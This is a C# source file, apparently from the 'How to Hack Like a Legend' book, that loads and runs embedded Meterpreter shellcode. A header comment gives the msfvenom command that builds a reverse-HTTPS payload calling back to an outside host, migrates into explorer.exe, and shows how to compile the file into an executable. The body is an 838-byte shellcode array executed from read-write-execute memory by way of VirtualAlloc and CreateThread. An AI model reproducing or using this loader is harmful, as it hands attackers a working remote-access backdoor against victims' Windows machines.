using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

/*
 Meterpreter wrapper inspired by https://github.com/Arno0x/CSharpScripts/blob/master/shellcodeLauncher.cs
 Example payload command line to paste in byte[] var variable: 
 root@Kali:~$ msfvenom -a x86 -p windows/meterpreter/reverse_winhttps LHOST=www.stratjumbo.co.au LPORT=443 prependmigrate=true prepenmigrateprocess=explorer.exe -f csharp
 
 Compile this C# wrapper using csc:
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /out:hello.exe .\msf_backdoor.cs
 
 PS: Change line 99 to suit your migration technique if you change the msfvenom command above.
 
 This wrapper was used in How to Hack Like a Legend book.
 
*/
namespace shellcode
{
    class Program
    {
        public static void Main()
        {
            byte[] var = new byte[838] {
            0xfc,0xe9,0x8a,0x00,0x00,0x00,0x5d,0x83,0xc5,0x0b,0x81,0xc4,0x70,0xfe,0xff,
0xff,0x8d,0x54,0x24,0x60,0x52,0x68,0xb1,0x4a,0x6b,0xb1,0xff,0xd5,0x8d,0x44,
0x24,0x60,0xeb,0x60,0x5e,0x8d,0x78,0x60,0x57,0x50,0x31,0xdb,0x53,0x53,0x68,
0x04,0x00,0x00,0x08,0x53,0x53,0x53,0x56,0x53,0x68,0x79,0xcc,0x3f,0x86,0xff,
0xd5,0x85,0xc0,0x74,0x59,0x6a,0x40,0x80,0xc7,0x10,0x53,0x53,0x31,0xdb,0x53,
0xff,0x37,0x68,0xae,0x87,0x92,0x3f,0xff,0xd5,0x54,0x68,0xac,0x02,0x00,0x00,
0xeb,0x39,0x50,0xff,0x37,0x68,0xc5,0xd8,0xbd,0xe7,0xff,0xd5,0x53,0x53,0x53,
0x8b,0x4c,0x24,0xfc,0x51,0x53,0x53,0xff,0x37,0x68,0xc6,0xac,0x9a,0x79,0xff,
0xd5,0x6a,0xff,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0xe8,0x9b,0xff,0xff,0xff,
0x72,0x75,0x6e,0x64,0x6c,0x6c,0x33,0x32,0x00,0xe8,0x71,0xff,0xff,0xff,0xe8,
0xc2,0xff,0xff,0xff,0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,
0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,
0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,
0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,
0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,
0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,
0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,
0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,
0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x74,0x74,0x70,0x00,0x68,0x77,0x69,0x6e,
0x68,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,
0x53,0x68,0x04,0x1f,0x9d,0xbb,0xff,0xd5,0x50,0x53,0x68,0xfb,0x20,0x00,0x00,
0xe8,0xcd,0x01,0x00,0x00,0x68,0x00,0x74,0x00,0x74,0x00,0x70,0x00,0x73,0x00,
0x3a,0x00,0x2f,0x00,0x2f,0x00,0x31,0x00,0x39,0x00,0x32,0x00,0x2e,0x00,0x31,
0x00,0x36,0x00,0x38,0x00,0x2e,0x00,0x31,0x00,0x2e,0x00,0x32,0x00,0x36,0x00,
0x3a,0x00,0x38,0x00,0x34,0x00,0x34,0x00,0x33,0x00,0x2f,0x00,0x58,0x00,0x69,
0x00,0x4b,0x00,0x63,0x00,0x45,0x00,0x54,0x00,0x75,0x00,0x30,0x00,0x42,0x00,
0x45,0x00,0x53,0x00,0x70,0x00,0x6a,0x00,0x36,0x00,0x69,0x00,0x4f,0x00,0x38,
0x00,0x79,0x00,0x76,0x00,0x2d,0x00,0x46,0x00,0x51,0x00,0x6b,0x00,0x4a,0x00,
0x55,0x00,0x6e,0x00,0x48,0x00,0x38,0x00,0x6a,0x00,0x68,0x00,0x69,0x00,0x68,
0x00,0x67,0x00,0x69,0x00,0x55,0x00,0x30,0x00,0x44,0x00,0x6e,0x00,0x54,0x00,
0x67,0x00,0x74,0x00,0x45,0x00,0x51,0x00,0x72,0x00,0x61,0x00,0x51,0x00,0x78,
0x00,0x5f,0x00,0x36,0x00,0x46,0x00,0x4d,0x00,0x7a,0x00,0x66,0x00,0x4c,0x00,
0x70,0x00,0x4f,0x00,0x74,0x00,0x35,0x00,0x7a,0x00,0x75,0x00,0x44,0x00,0x34,
0x00,0x64,0x00,0x67,0x00,0x6e,0x00,0x59,0x00,0x49,0x00,0x56,0x00,0x6f,0x00,
0x4d,0x00,0x69,0x00,0x4c,0x00,0x75,0x00,0x42,0x00,0x41,0x00,0x59,0x00,0x6b,
0x00,0x55,0x00,0x52,0x00,0x57,0x00,0x6b,0x00,0x35,0x00,0x00,0x00,0x83,0xc7,
0x32,0x50,0x68,0x46,0x9b,0x1e,0xc2,0xff,0xd5,0x68,0x00,0x01,0x80,0x00,0x53,
0x53,0x53,0x57,0x53,0x50,0x68,0x98,0x10,0xb3,0x5b,0xff,0xd5,0x96,0x83,0xec,
0x10,0x89,0xe0,0x57,0x89,0xc7,0x57,0x68,0x21,0xa7,0x0b,0x60,0xff,0xd5,0x85,
0xc0,0x74,0x4d,0x8b,0x47,0x04,0x85,0xc0,0x74,0x2a,0x5a,0x83,0xea,0x32,0x6a,
0x01,0x53,0x53,0x50,0x6a,0x03,0x6a,0x03,0x89,0xe0,0x83,0xec,0x0c,0x89,0xe7,
0x57,0x50,0x52,0x8d,0x44,0x24,0x40,0xff,0x30,0x68,0xda,0xdd,0xea,0x49,0xff,
0xd5,0x85,0xc0,0x74,0x1e,0xeb,0x0f,0x8b,0x47,0x08,0x85,0xc0,0x74,0x15,0x6a,
0x04,0x58,0x01,0xc7,0x48,0x89,0x07,0x6a,0x0c,0x57,0x6a,0x26,0x56,0x68,0xd3,
0x58,0x9d,0xce,0xff,0xd5,0x68,0x00,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,
0x6a,0x1f,0x56,0x68,0xd3,0x58,0x9d,0xce,0xff,0xd5,0x6a,0x0a,0x5f,0x53,0x53,
0x53,0x53,0x53,0x53,0x56,0x68,0x95,0x58,0xbb,0x91,0xff,0xd5,0x85,0xc0,0x75,
0x08,0x4f,0x75,0xeb,0xe8,0x63,0x00,0x00,0x00,0x53,0x56,0x68,0x05,0x88,0x9d,
0x70,0xff,0xd5,0x85,0xc0,0x74,0xee,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,
0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,
0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x6c,0x29,0x24,0x7e,
0xff,0xd5,0x85,0xc0,0x74,0xc2,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,
0xc3,0x5f,0xe8,0x07,0xff,0xff,0xff,0x31,0x00,0x39,0x00,0x32,0x00,0x2e,0x00,
0x31,0x00,0x36,0x00,0x38,0x00,0x2e,0x00,0x31,0x00,0x2e,0x00,0x32,0x00,0x36,
0x00,0x00,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)var.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(var, 0, (IntPtr)(funcAddr), var.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data


            IntPtr pinfo = IntPtr.Zero;

            // execute native code

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            //If prependmigrate=true in msfvenom, a wait value of 5000 ms should be sufficient for the main process to terminate after migration.
            WaitForSingleObject(hThread, 5000);

            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );

    }
}
